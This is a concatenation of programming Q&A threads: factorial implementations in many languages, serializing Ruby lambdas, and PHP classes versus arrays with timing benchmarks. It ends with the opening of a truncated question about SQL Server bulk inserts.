#[&lt;&lt;+&gt;+&gt;-]&lt;-&gt;+&lt;[&gt;-&lt;[-]]&gt;[-&lt;&lt;-&lt;&lt;&lt;&lt;[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;+*/
uc;if($n==0){return&#32;1;}return&#32;$n*fact($n-1);&#09;}//;#
eval{abs;z($n);print&#32;fact($n);print(""\n"")/*2;};#-]&lt;-&gt;
'+&lt;[&gt;-&lt;[-]]&gt;]&lt;&lt;[&lt;&lt;&lt;&lt;]&lt;&lt;&lt;&lt;-[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-]+&lt;[&gt;-+++
-}--&#09;&lt;[-]]&gt;[-&lt;&lt;++++++++++&lt;&lt;&lt;&lt;-[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+&gt;-++
fact&#32;0&#09;=&#32;1&#32;--&#32;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&#09;&gt;&#32;&lt;&gt;&lt;&gt;&lt;&#09;]+&lt;[&gt;-&lt;[-]]&gt;]&lt;&lt;[&lt;&lt;+&#32;+
fact&#09;n=n*fact(n-1){-&lt;&lt;]&gt;&gt;&gt;&gt;[[&gt;&gt;+&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;+++&gt;+-}
main=do{n&lt;-readLn;print(fact&#32;n)}--&#32;+&gt;-]&lt;-&gt;+&lt;[&gt;&gt;&gt;&gt;+&lt;&lt;+
{-x&lt;-&lt;[-]]&gt;[-]&gt;&gt;]&gt;]&gt;&gt;&gt;[&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[&gt;+++++++[&lt;+++++++&gt;-]
&lt;--.&lt;&lt;&lt;&lt;]+written+by+++A+Rex+++2009+.';#+++x-}--x*/;}
</pre>
 <p><strong>ActionScript: Procedural/OOP</strong></p>

<pre><code>function f(n) {
    var result = n&gt;1 ? arguments.callee(n-1)*n : 1;
    return result;
}
// function call
f(3);
</code></pre>
 <h1>Common Lisp</h1>

<p>I'm fairly sure this could be more effieicnet. It is my first lisp function other than ""hello, world"" and typing in the example code in the third chapter. <em>Practical Common Lisp</em> is a great text. This function does seem to handle large factorials well.</p>

<pre><code>(defun factorial (x)
  (if (&lt; x 2) (return-from factorial (print 1)))
  (let ((tempx 1) (ans 1))
  (loop until (equalp x tempx) do
       (incf tempx)
       (setf ans (* tempx ans)))
  (list ans)))
</code></pre>
 <h1>Delphi iterative</h1>

<p>While recursion can be the only decent solution to a problem, for factorials it is not. To describe it, yes. To program it, no. Iteration is cheapest.</p>

<p>This function calculates factorials for somewhat larger arguments.</p>

<pre><code>function Factorial(aNumber: Int64): String;
var
  F: Double;
begin
  F := 0;
  while aNumber &gt; 1 do begin
    F := F + log10(aNumber);
    dec(aNumber);
  end;
  Result := FloatToStr(Power(10, Frac(F))) + ' * 10^' + IntToStr(Trunc(F));
end;
</code></pre>

<p>1000000! = 8.2639327850046 * 10^5565708</p>
 <p>Hmm... no TCL</p>

<pre><code>proc factorial {n} {
  if { $n == 0 } { return 1 }
  return [expr {$n*[factorial [expr {$n-1}]]}]
}
puts [factorial 6]
</code></pre>

<p>But of course that doesn't work for a damn for large values of n.... we can do better with tcllib!</p>

<pre><code>package require math::bignum
proc factorial {n} {
  if { $n == 0 } { return 1 }
  return [ ::math::bignum::tostr [ ::math::bignum::mul [
    ::math::bignum::fromstr $n] [ ::math::bignum::fromstr [
      factorial [expr {$n-1} ]
    ]]]]
}
puts [factorial 60]
</code></pre>

<p>Look at all those ]'s at the end.  This is practically LISP!</p>

<p>I'll leave the version for values of n>2^32 as an excersize for the reader</p>
 <h1>Logo</h1>

<pre><code>? to factorial :n
&gt; ifelse :n = 0 [output 1] [output :n * factorial :n - 1]
&gt; end
</code></pre>

<p>And to invoke:</p>

<pre><code>? print factorial 5
120
</code></pre>

<p>This is using the UCBLogo dialect of logo.</p>
 <h1>Mathematica, Memoized</h1>

<pre><code>f[n_ /; n &lt; 2] := 1
f[n_] := (f[n] = n*f[n - 1])
</code></pre>

<p>Mathematica supports n! natively, but this shows how to make definitions on the fly.  When you execute f[2], this code will make a definition f[2]=2 which will subsequently be executed no differently than if you'd hard-coded it; no need for an internal data structure; you just use the language's own function definition machinery.</p>
 <p><strong>Lisp : tail-recursive</strong></p>

<pre><code>(defun factorial(x)
  (labels((f (x acc)
             (if (&gt; x 1)
                 (f (1- x)(* x acc))
                 acc)))
         (f x 1)))
</code></pre>
 <h2>Agda2</h2>

<p>It is Agda2, using the very nice Agda2 syntax.</p>

<pre><code>module fac where

data Nat : Set where        -- Peano numbers
  zero : Nat
  suc : Nat -&gt; Nat
{-# BUILTIN NATURAL Nat #-}
{-# BUILTIN SUC suc #-}
{-# BUILTIN ZERO zero #-}

infixl 10 _+_               -- Addition over Peano numbers
_+_ : Nat -&gt; Nat -&gt; Nat
zero + n    = n
(suc n) + m = suc (n + m)

infixl 20 _*_               -- Multiplication over Peano numbers
_*_ : Nat -&gt; Nat -&gt; Nat
zero * n = zero
n * zero = zero
(suc n) * (suc m) = suc n + (suc n * m)

_! : Nat -&gt; Nat             -- Factorial function, syntax: ""x !""
zero ! = suc zero
(suc n) ! = (suc n) * (n !)
</code></pre>
 <p>Another ruby one.</p>

<pre><code>class Integer
  def fact
    return 1 if self.zero?
    (1..self).to_a.inject(:*)
  end
end</code></pre>

<p>This works if to_proc is supported on symbols.</p>
 <p>Perl, pessimal:</p>

<pre><code># Because there are just so many other ways to get programs wrong...
use strict;
use warnings;

sub factorial {
    my ($x)=@_;

    for(my $f=1;;$f++) {
        my $tmp=$f;
        foreach my $g (1..$x) {
           $tmp/=$g;
        }
        return $f if $tmp == 1;
    }
}
</code></pre>

<p>I trust I get extra points for not using the '*' operator...</p>
 <h1>REBOL</h1>

<p>Math is <em>definitely</em> not one of REBOL's strong points, since it lacks arbitrary precision integers. For the sake of completeness, I thought I'd add it anyway.</p>

<p>Here's a standard, na&iuml;ve recursive implementation:</p>

<pre>fac: func [ [catch] n [integer!] ] [
    if n &lt; 0 [ throw make error! ""Hey dummy, your argument was less than 0!"" ]
    either n = 0 [ 1 ] [
        n * fac (n - 1)
    ]
]</pre>

<p>And that's about it. Move along, folks, nothing to see here ... :)</p>
 <p>Here's my proposal. Runs in Mathematica, works fine:</p>

<pre><code>gen[f_, n_] := Module[{id = -1, val = Table[Null, {n}], visit},
  visit[k_] := Module[{t},
    id++; If[k != 0, val[[k]] = id];
    If[id == n, f[val]];
    Do[If[val[[t]] == Null, visit[t]], {t, 1, n}];
    id--; val[[k]] = Null;];
  visit[0];
  ]

Factorial[n_] := Module[{res=0}, gen[res++&amp;, n]; res]
</code></pre>

<p><strong>Update</strong>
Ok, here's how it works: the visit function is from Sedgewick's Algorithm book, it ""visits"" all permutations of length n. Upon the visit, it calls function f with the permutation as an argument. </p>

<p>So, Factorial enumerates all permutations of length n, and for each permutation the counter res is increased, thus computing n! in O(n+1)! time.</p>
 <p>Python: </p>

<pre><code>def factorial(n):
    return reduce(lambda x, y: x * y,range(1, n + 1))
</code></pre>
 <h1>PHP - 59 chars</h1>

<pre><code>function f($n){return array_reduce(range(1,$n),'bcmul',1);}
</code></pre>

<hr>

<h1>Improved Version - 27 chars</h1>

<pre><code>array_product(range(1,$n));
</code></pre>
 <p><strong>*NIX Shell</strong></p>

<p>Linux version:</p>

<pre><code>seq -s'*' 42 | bc
</code></pre>

<p>BSD version:</p>

<pre><code>jot -s'*' 42 | bc
</code></pre>
 <h2>SETL</h2>

<p>...where Haskell and Python borrowed their list comprehensions from.</p>

<pre><code>proc factorial(n);
    return 1 */ {1..n};
end factorial;
</code></pre>

<p>And the built-in <code>INTEGER</code> type is arbitrary-precision, so this will work for any positive <code>n</code>.</p>
 <p><a href=""http://esolangs.org/wiki/Befunge"" rel=""nofollow""><strong><h1>Befunge:</h1></strong></a></p>

<pre><code>0&amp;&gt;:1-:v v *_$.@ 
  ^    _$&gt;\:^
</code></pre>
 <h2>CLOS</h2>

<p>I see Common Lisp solutions abusing recursion, LOOP, and even FORMAT.  I guess it's time for somebody to write a solution that abuses CLOS!</p>

<pre><code>(defgeneric factorial (n))
(defmethod factorial ((n (eql 0))) 1)
(defmethod factorial ((n integer)) (* n (factorial (1- n))))
</code></pre>

<p>(Can your favorite language's object system dispatcher do that?)</p>
 <h1>Golfscript: designed for golfing, of course</h1>

<pre><code>~),1&gt;{*}*
</code></pre>

<ul>
<li><code>~</code> evaluates the input string (to an integer)</li>
<li><code>)</code> increments the number</li>
<li><code>,</code> is range (4, becomes [0 1 2 3])</li>
<li><code>1&gt;</code> selects values whose index is 1 or bigger</li>
<li><code>{*}*</code> folds multiplication over the list</li>
<li>Stack contents are printed when the program terminates.</li>
</ul>

<p>To run:</p>

<pre><code>echo 5 | ruby gs.rb fact.gs
</code></pre>
 <p>FORTH, iterative 1 liner</p>

<pre><code>: FACT 1 SWAP 1 + 1 DO I * LOOP ;
</code></pre>
 <h2>Oh fork() its another example in Perl</h2>

<p>This will make use of your multiple core CPUs... although perhaps not in the most effective manner.  The <em>open</em> statement clones the process with fork and opens a pipe from the child process to the parent. The work of multiplying numbers 2 at a time is split among a tree of very short lived processes. Of course, this example is a bit silly. The point is that if you actually had more difficult calculations to do then this example illustrates one way to divide up the work in parallel.</p>

<pre><code>#!/usr/bin/perl -w

use strict;
use bigint;

print STDOUT &amp;main::rangeProduct(1,$ARGV[0]).""\n"";

sub main::rangeProduct {
    my($l, $h) = @_;
    return $l    if ($l==$h);
    return $l*$h if ($l==($h-1));
    # arghhh - multiplying more than 2 numbers at a time is too much work
    # find the midpoint and split the work up :-)
    my $m = int(($h+$l)/2);
    my $pid = open(my $KID, ""-|"");
      if ($pid){ # parent
        my $X = &amp;main::rangeProduct($l,$m);
        my $Y = &lt;$KID&gt;;
        chomp($Y);
        close($KID);
        die ""kid failed"" unless defined $Y;
        return $X*$Y;
      } else {
        # kid
        print STDOUT &amp;main::rangeProduct($m+1,$h).""\n"";
        exit(0);
    }
}
</code></pre>
 <p>In <a href=""http://iolanguage.org/"" rel=""nofollow"">Io</a>:</p>

<pre><code>factorial := method(n,
    if (list(0, 1) contains(n),
       1,
       n * factorial(n - 1)
    )
)
</code></pre>
 <h1>Scheme evolution</h1>

<h2>Regular Scheme program:</h2>

<pre><code>(define factorial
   (lambda (n)
     (if (= n 0)
         1
         (* n (factorial (- n 1))))))
</code></pre>

<p>Should work, but notice that calling this function on large numbers will extend the stack on every recursion, which is bad in languages like C and Java.</p>

<h2>Continuation-passing style</h2>

<pre><code>(define factorial
  (lambda (n)
    (factorial_cps n (lambda (k) k))))

(define factorial_cps
  (lambda (n k)
    (if (zero? n)
        (k 1)
        (factorial (- n 1) (lambda (v)
                             (k (* n v)))))))
</code></pre>

<p>Ah, this way, we don't grow our stack every recursion because we can extend a continuation instead.  However, C doesn't have continuations.</p>

<h2>Representation-independent CPS</h2>

<pre><code>(define factorial
  (lambda (n)
    (factorial_cps n (k_))))

(define factorial_cps
  (lambda (n k)
    (if (zero? n)
        (apply_k 1)
        (factorial (- n 1) (k_extend n k))))

(define apply_k
  (lambda (ko v)
    (ko v)))
(define kt_empty
  (lambda ()
    (lambda (v) v)))
(define kt_extend 
  (lambda ()
    (lambda (v)
      (apply_k k (* n v)))))
</code></pre>

<p>Notice that responsibility for representation of the continuations used in the original CPS program has been shifted to the <code>kt_</code> helper procedures.</p>

<h2>Representation-independent CPS using ParentheC unions</h2>

<p>Since representation of the continuations is in the helper procedures, we can switch to using <a href=""https://www.cs.indiana.edu/cgi-pub/lkuper/b521/_media/parenthec.pdf"" rel=""nofollow"">ParentheC</a> instead, with <code>kt_</code> being a type designator. </p>

<pre><code>(define factorial
  (lambda (n)
    (factorial_cps n (kt_empty))))

(define factorial_cps
  (lambda (n k)
    (if (zero? n)
        (apply_k 1)
        (factorial (- n 1) (kt_extend n k))))

(define-union kt
  (empty)
  (extend n k))
(define apply_k
  (lambda ()
    (union-case kh kt
      [(empty) v]
      [(extend n k) (begin
                      (set! kh k)
                      (set! v (* n v))
                      (apply_k))])))
</code></pre>

<h2>Trampolined, registerized ParentheC program</h2>

<p>That's not enough.  We now replace all function calls by instead setting global variables and a program counter.  Procedures are now labels suitable for GOTO statements.</p>

<pre><code>(define-registers n k kh v)
(define-program-counter pc)

(define-label main
  (begin
    (set! n 5) ; what is the factorial of 5??
    (set! pc factorial_cps)
    (mount-trampoline kt_empty k pc)
    (printf ""Factorial of 5: ~d\n"" v)))

(define-label factorial_cps
  (if (zero? n)
      (begin
        (set! kh k)
        (set! v 1)
        (set! pc apply_k))
      (begin
        (set! k (kt_extend n k))
        (set! n (- n 1))
        (set! pc factorial_cps))))

(define-union kt
  (empty dismount) ; get off the trampoline!
  (extend n k))

(define-label apply_k
  (union-case kh kt
    [(empty dismount) (dismount-trampoline dismount)]
    [(extend n k) (begin
                    (set! kh k)
                    (set! v (* n v))
                    (set! pc apply_k))]))
</code></pre>

<p>Oh look, we have a <code>main</code> procedure now too.  Now all that's left to do is save this file as <code>fact5.pc</code> and run it through ParentheC's pc2c:</p>

<pre><code>&gt; (load ""pc2c.ss"")
&gt; (pc2c ""fact5.pc"" ""fact5.c"" ""fact5.h"")
</code></pre>

<p>Could it be?  We got <code>fact5.c</code> and <code>fact5.h</code>.  Let's see...</p>

<pre><code>$ gcc fact5.c -o fact5
$ ./fact5
Factorial of 5: 120
</code></pre>

<p>Success! We have converted a recursive Scheme program into a non-recursive C program! And it only took several hours and many forehead-shaped impressions in the wall to do it!  For convenience, <a href=""http://pastebin.ca/1881437"" rel=""nofollow"">fact5.c</a> and 
 and <a href=""http://pastebin.ca/1881438"" rel=""nofollow"">fact5.h</a>.</p>
 <p><strong>Python:</strong>
functional, recursive one-liner using short circuit boolean evaluation.</p>

<pre><code>    factorial = lambda n: ((n &lt;= 1) and 1) or factorial(n-1) * n
</code></pre>
 <h1>T-SQL: Recursive CTE</h1>

<p>Inline table function using a recursive common table expression. SQL Server 2005 and up.</p>

<pre><code>CREATE FUNCTION dbo.Factorial(@n int) RETURNS TABLE
AS
RETURN
    WITH RecursiveCTE (N, Value) AS
    (
        SELECT 1, CAST(1 AS decimal(38,0))
        UNION ALL
        SELECT N+1, CAST(Value*(N+1) AS decimal(38,0))
        FROM RecursiveCTE
    )
    SELECT TOP 1 Value
    FROM RecursiveCTE
    WHERE N = @n
</code></pre>
 <p>C++ constexpr</p>

<pre><code>constexpr uint64_t fact(uint32_t n)
{
    return  (n==0) ? 1:n*fact(n-1);
}
</code></pre>
 <p><strong>Vb6 :</strong></p>

<pre><code>Private Function factCalculation(ByVal Number%)
  Dim intNum%
  intNum = 1
  For i = 2 To Number
     intNum = intNum * Number
  Next i
  return intNum
End Function

Private Sub Form_Load()
 Dim FactResult% : FactResult = factCalculation(3) 'e.g
 Print FactResult
End Sub
</code></pre>
"
"How do I marshal a lambda (Proc) in Ruby? <p>Joe Van Dyk <a href=""http://www.zenspider.com/pipermail/ruby/2008-August/004223.html"">asked the Ruby mailing list</a>:</p>

<blockquote>
  <p>Hi,</p>
  
  <p>In Ruby, I guess you can't marshal a lambda/proc object, right?  Is
  that possible in lisp or other languages?</p>
  
  <p>What I was trying to do:</p>
</blockquote>

<pre><code>l = lamda { ... }
Bj.submit ""/path/to/ruby/program"", :stdin =&gt; Marshal.dump(l)
</code></pre>

<blockquote>
  <p>So, I'm sending BackgroundJob a lambda object, which contains the
  context/code for what to do.  But, guess that wasn't possible.  I
  ended up marshaling a normal ruby object that contained instructions
  for what to do after the program ran.</p>
  
  <p>Joe</p>
</blockquote>
 <p>Try <a href=""http://seattlerb.rubyforge.org/ruby2ruby/"" rel=""nofollow"">ruby2ruby</a></p>
 <p>You cannot marshal a Lambda or Proc. This is because both of them are considered closures, which means they close around the memory on which they were defined and can reference it. (In order to marshal them you'd have to Marshal all of the memory they could access at the time they were created.)</p>

<p>As Gaius pointed out though, you can use <a href=""https://github.com/seattlerb/ruby2ruby"" rel=""nofollow"">ruby2ruby</a> to get a hold of the string of the program. That is, you can marshal the string that represents the ruby code and then reevaluate it later. </p>
 <p>If you're interested in getting a string version of Ruby code using Ruby2Ruby, you might like <a href=""http://stackoverflow.com/questions/199603/how-do-you-stringize-serialize-ruby-code"">this thread</a>.</p>
 <p>you could also just enter your code as a string:</p>

<pre><code>code = %{
    lambda {""hello ruby code"".split("" "").each{|e| puts e + ""!""}}
}
</code></pre>

<p>then execute it with eval </p>

<pre><code>eval code
</code></pre>

<p>which will return a ruby lamda.</p>

<p>using the <code>%{}</code> format escapes a string, but only closes on an unmatched brace. i.e. you can nest braces like this <code>%{ [] {} }</code> and it's still enclosed. </p>

<p>most text syntax highlighters don't realize this is a string, so still display regular code highlighting.</p>
 <p>I've found proc_to_ast to do the best job: <a href=""https://github.com/joker1007/proc_to_ast"" rel=""nofollow"">https://github.com/joker1007/proc_to_ast</a>.</p>

<p>Works for sure in ruby 2+, and I've created a PR for ruby 1.9.3+ compatibility(<a href=""https://github.com/joker1007/proc_to_ast/pull/3"" rel=""nofollow"">https://github.com/joker1007/proc_to_ast/pull/3</a>)</p>
"
"Classes vs 2D arrays <p>Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.</p>

<pre><code>// Using a class
class someClass
{
    public  $name;
    public  $height;
    public  $weight;

    function __construct($name, $height, $weight)
    {
        $this -&gt; name       = $name;
        $this -&gt; height = $height;
        $this -&gt; weight = $weight;
    }
}

$classArray[1] = new someClass('Bob', 10, 20);
$classArray[2] = new someClass('Fred', 15, 10);
$classArray[3] = new someClass('Ned', 25, 30);


// Using a 2D array
$normalArray[1]['name'] = 'Bob';
$normalArray[1]['height']   = 10;
$normalArray[1]['weight']   = 20;

$normalArray[2]['name'] = 'Fred';
$normalArray[2]['height']   = 15;
$normalArray[2]['weight']   = 10;

$normalArray[3]['name'] = 'Ned';
$normalArray[3]['height']   = 25;
$normalArray[3]['weight']   = 30;
</code></pre>

<hr>

<p>Assuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.</p>

<p>I've not idea which answer I should accept to I've just upvoted all of them.</p>

<hr>

<p>And I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.</p>

<p>Thank you for helping to make me a better programmer.</p>
 <p>It depends exactly what you mean by 'better'. I'd go for the object oriented way (using classes) because I find it makes for cleaner code (at least in my opinion). However, I'm not sure what the speed penalties might be for that option.</p>
 <p>The ""class"" that you've constructed above is what most people would use a <em>struct</em> for in other languages. I'm not sure what the performance implications are in PHP, though I suspect instantiating the objects is probably more costly here, if only by a little bit.</p>

<p>That being said, if the cost is relatively low, it IS a bit easier to manage the objects, in my opinion.</p>

<p>I'm only saying the following based on the title and your question, but:
Bear in mind that classes provide the advantage of methods and access control, as well. So if you wanted to ensure that people weren't changing weights to negative numbers, you could make the <code>weight</code> field private and provide some accessor methods, like <code>getWeight()</code> and <code>setWeight()</code>. Inside <code>setWeight()</code>, you could do some value checking, like so:</p>

<pre><code>public function setWeight($weight)
{
    if($weight &gt;= 0)
    {
        $this-&gt;weight = $weight;
    }
    else
    {
        // Handle this scenario however you like
    }
}
</code></pre>
 <p>Generally, I follow this rule:</p>

<p>1) Make it a class if multiple parts of your application use the data structure.</p>

<p>2) Make it a 2D array if you're using it for quick processing of data in one part of your application.</p>
 <blockquote>
  <blockquote>
    <p>It's the speed that I am thinking of mostly, for anything more complex than what I have here I'd probably go with classes but the question is, what is the cost of a class?</p>
  </blockquote>
</blockquote>

<p>This would seem to be premature optimisation. Your application isn't going to take any real-world performance hit either way, but using a class lets you use getter and setter methods and is generally going to be better for code encapsulation and code reuse. </p>

<p>With the arrays you're incurring cost in harder to read and maintain code, you can't unit test the code as easily and with a good class structure other developers should find it easier to understand if they need to take it on.</p>

<p>And when later on you need to add other methods to manipulate these, you won't have an architecture to extend.</p>
 <p>The class that you have is not a real class in OO terms - its just been contructed to take the space of the instance variables.</p>

<p>That said - there propably isnt much issue with speed - its just a style thing in your example.</p>

<p>The intresting bit - is if you contsrtucted the object to be a real ""person"" class - and thinkng about the other attributes and actions that you may want of the person class - then you would notice not only a style performance - writting code - but also speed performance.</p>
 <p>If your code uses lot of functions that operate on those attributes (name/height/weight), then using class could be a good option.</p>
 <p>Teifion, if you use classes as a mere replacement for arrays, you are nowhere near OOP. The essence of OOP is that objects have knowledge and responsibility, can actually do things and cooperate with other classes. Your objects have knowledge only and can't do anything else than idly exist, however they seem to be good candidates for persistence providers (objects that know how to store/retrieve themselves into/from database).</p>

<p>Don't worry about performance, too. Objects in PHP are fast and lightweight and performance in general is much overrated. It's cheaper to save your time as a programmer using the right approach than to save microseconds in your program with some obscure, hard to debug and fix piece of code.</p>
 <p>Most tests that time arrays vs classes only test instancing them.  Once you actually start to do something with them.</p>

<p>I was a ""purist"" that used only arrays because the performance was SO much better.  I wrote the following code to justify to myself to justify the extra hassle of not using classes (even though they are easier on the programmer)</p>

<p>Let's just say I was VERY surprised at the results!</p>

<pre><code>    &lt;?php
$rx = """";
$rt = """";
$rf = """";

$ta = 0; // total array time
$tc = 0; // total class time

// flip these to test different attributes
$test_globals = true;
$test_functions = true;
$test_assignments = true;
$test_reads = true;


// define class


class TestObject
{
  public $a;
  public $b;
  public $c;
  public $d;
  public $e;
  public $f;

  public function __construct($a,$b,$c,$d,$e,$f)
  {
    $this-&gt;a = $a;
    $this-&gt;b = $b;
    $this-&gt;c = $c;
    $this-&gt;d = $d;
    $this-&gt;e = $e;
    $this-&gt;f = $f;
  }

  public function setAtoB()
  {
      $this-&gt;a = $this-&gt;b;
  }
}

// begin test

echo ""&lt;br&gt;test reads: "" . $test_reads;
echo ""&lt;br&gt;test assignments: "" . $test_assignments;
echo ""&lt;br&gt;test globals: "" . $test_globals;
echo ""&lt;br&gt;test functions: "" . $test_functions;
echo ""&lt;br&gt;"";

for ($z=0;$z&lt;10;$z++)
{
    $starta = microtime(true);

    for ($x=0;$x&lt;100000;$x++)
    {
        $xr = getArray('aaa','bbb','ccccccccc','ddddddddd','eeeeeeee','fffffffffff');

        if ($test_assignments)
        {
            $xr['e'] = ""e"";
            $xr['c'] = ""sea biscut"";
        }

        if ($test_reads)
        {
            $rt = $x['b'];
            $rx  = $x['f'];
        }

        if ($test_functions) { setArrAtoB($xr); }
        if ($test_globals) { $rf = glb_arr(); }
    }
    $ta = $ta + (microtime(true)-$starta);
    echo ""&lt;br/&gt;Array time = "" . (microtime(true)-$starta) . ""\n\n"";


    $startc = microtime(true);

    for ($x=0;$x&lt;100000;$x++)
    {
        $xo = new TestObject('aaa','bbb','ccccccccc','ddddddddd','eeeeeeee','fffffffffff');

        if ($test_assignments)
        {
            $xo-&gt;e = ""e"";
            $xo-&gt;c = ""sea biscut"";
        }

        if ($test_reads)
        {
            $rt = $xo-&gt;b;
            $rx = $xo-&gt;f;
        }

        if ($test_functions) { $xo-&gt;setAtoB(); }
        if ($test_globals) { $xf = glb_cls(); }
    }

    $tc = $tc + (microtime(true)-$startc);
    echo ""&lt;br&gt;Class time = "" . (microtime(true)-$startc) . ""\n\n"";

    echo ""&lt;br&gt;"";
    echo ""&lt;br&gt;Total Array time (so far) = "" . $ta . ""(100,000 iterations) \n\n"";
    echo ""&lt;br&gt;Total Class time (so far) = "" . $tc . ""(100,000 iterations) \n\n"";
    echo ""&lt;br&gt;"";

}
echo ""TOTAL TIMES:"";
echo ""&lt;br&gt;"";
echo ""&lt;br&gt;Total Array time = "" . $ta . ""(1,000,000 iterations) \n\n"";
echo ""&lt;br&gt;Total Class time = "" . $tc . ""(1,000,000 iterations)\n\n"";


// test functions

function getArray($a,$b,$c,$d,$e,$f)
{
    $arr = array();
    $arr['a'] = $a;
    $arr['b'] = $b;
    $arr['c'] = $c;
    $arr['d'] = $d;
    $arr['d'] = $e;
    $arr['d'] = $f;
    return($arr);
}

//-------------------------------------

function setArrAtoB($r)
{
    $r['a'] = $r['b'];
}

//-------------------------------------

function glb_cls()
{
    global $xo;

    $xo-&gt;d = ""ddxxdd"";
    return ($xo-&gt;f);
}

//-------------------------------------

function glb_arr()
{
    global $xr;

    $xr['d'] = ""ddxxdd"";
    return ($xr['f']);
}

//-------------------------------------

?&gt;
</code></pre>

<p>test reads: 1
test assignments: 1
test globals: 1
test functions: 1</p>

<p>Array time = 1.58905816078
Class time = 1.11980104446
Total Array time (so far) = 1.58903813362(100,000 iterations)
Total Class time (so far) = 1.11979603767(100,000 iterations)</p>

<p>Array time = 1.02581000328
Class time = 1.22492313385
Total Array time (so far) = 2.61484408379(100,000 iterations)
Total Class time (so far) = 2.34471416473(100,000 iterations)</p>

<p>Array time = 1.29942297935
Class time = 1.18844485283
Total Array time (so far) = 3.91425895691(100,000 iterations)
Total Class time (so far) = 3.5331492424(100,000 iterations)</p>

<p>Array time = 1.28776097298
Class time = 1.02383089066
Total Array time (so far) = 5.2020149231(100,000 iterations)
Total Class time (so far) = 4.55697512627(100,000 iterations)</p>

<p>Array time = 1.31235599518
Class time = 1.38880181313
Total Array time (so far) = 6.51436591148(100,000 iterations)
Total Class time (so far) = 5.94577097893(100,000 iterations)</p>

<p>Array time = 1.3007349968
Class time = 1.07644081116
Total Array time (so far) = 7.81509685516(100,000 iterations)
Total Class time (so far) = 7.02220678329(100,000 iterations)</p>

<p>Array time = 1.12752890587
Class time = 1.07106018066
Total Array time (so far) = 8.94262075424(100,000 iterations)
Total Class time (so far) = 8.09326195717(100,000 iterations)</p>

<p>Array time = 1.08890199661
Class time = 1.09139609337
Total Array time (so far) = 10.0315177441(100,000 iterations)
Total Class time (so far) = 9.18465089798(100,000 iterations)</p>

<p>Array time = 1.6172170639
Class time = 1.14714384079
Total Array time (so far) = 11.6487307549(100,000 iterations)
Total Class time (so far) = 10.3317887783(100,000 iterations)</p>

<p>Array time = 1.53738498688
Class time = 1.28127002716
Total Array time (so far) = 13.1861097813(100,000 iterations)
Total Class time (so far) = 11.6130547523(100,000 iterations) </p>

<p>TOTAL TIMES:
Total Array time = 13.1861097813(1,000,000 iterations)
Total Class time = 11.6130547523(1,000,000 iterations) </p>

<p>So, either way the difference is pretty negligible.  I was very suprized to find that once you start accessing things globally, classes actually become a little faster.</p>

<p>But don't trust me, run it for your self.  I personally now feel completely guilt free about using classes in my high performance applications. :D</p>
 <p>@Richard Varno</p>

<p>I Ran your exact code (after fixed the small bugs), and got much different results than you. Classes ran much on my PHP 5.3.17 install.</p>

<p>Array time = 0.69054913520813
Class time = 1.1762700080872</p>

<p>Total Array time (so far) = 0.69054508209229(100,000 iterations)
Total Class time (so far) = 1.1762590408325(100,000 iterations)</p>

<p>Array time = 0.99001502990723
Class time = 1.22034907341</p>

<p>Total Array time (so far) = 1.6805560588837(100,000 iterations)
Total Class time (so far) = 2.3966031074524(100,000 iterations)</p>

<p>Array time = 0.99191808700562
Class time = 1.2245700359344</p>

<p>Total Array time (so far) = 2.6724660396576(100,000 iterations)
Total Class time (so far) = 3.6211669445038(100,000 iterations)</p>

<p>Array time = 0.9890251159668
Class time = 1.2246470451355</p>

<p>Total Array time (so far) = 3.661484003067(100,000 iterations)
Total Class time (so far) = 4.8458080291748(100,000 iterations)</p>

<p>Array time = 0.99573588371277
Class time = 1.1242771148682</p>

<p>Total Array time (so far) = 4.6572148799896(100,000 iterations)
Total Class time (so far) = 5.9700801372528(100,000 iterations)</p>

<p>Array time = 0.88518786430359
Class time = 1.1427340507507</p>

<p>Total Array time (so far) = 5.5423986911774(100,000 iterations)
Total Class time (so far) = 7.1128082275391(100,000 iterations)</p>

<p>Array time = 0.87605404853821
Class time = 0.95899105072021</p>

<p>Total Array time (so far) = 6.4184486865997(100,000 iterations)
Total Class time (so far) = 8.0717933177948(100,000 iterations)</p>

<p>Array time = 0.73414516448975
Class time = 1.0223190784454</p>

<p>Total Array time (so far) = 7.1525888442993(100,000 iterations)
Total Class time (so far) = 9.0941033363342(100,000 iterations)</p>

<p>Array time = 0.95230412483215
Class time = 1.059828042984</p>

<p>Total Array time (so far) = 8.1048839092255(100,000 iterations)
Total Class time (so far) = 10.153927326202(100,000 iterations)</p>

<p>Array time = 0.75814390182495
Class time = 0.84455919265747</p>

<p>Total Array time (so far) = 8.8630249500275(100,000 iterations)
Total Class time (so far) = 10.998482465744(100,000 iterations)
TOTAL TIMES:</p>

<p>Total Array time = 8.8630249500275(1,000,000 iterations)
Total Class time = 10.998482465744(1,000,000 iterations) </p>
"
"What's the fastest way to bulk insert a lot of data in SQL Server (C# client) <p>I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.</p>

<p>I am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.</p>

<p>I have a simple table that looks like this: </p>

<pre><code> CREATE TABLE [BulkData](
 [ContainerId] [int] NOT NULL,
 [BinId] [smallint] NOT NULL,
 [Sequence] [smallint] NOT NULL,
 [ItemId] [int] NOT NULL,
 [Left] [smallint] NOT NULL,
 [Top] [smallint] NOT NULL,
 [Right] [smallint] NOT NULL,
 [Bottom] [smallint] NOT NULL,
 CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED 
 (
  [ContainerIdId] ASC,
  [BinId] ASC,
  [Sequence] ASC
))
</code></pre>

<p>I'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  </p>

<p>The %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.</p>

<p>Does it help any if I:</p>

<ol>
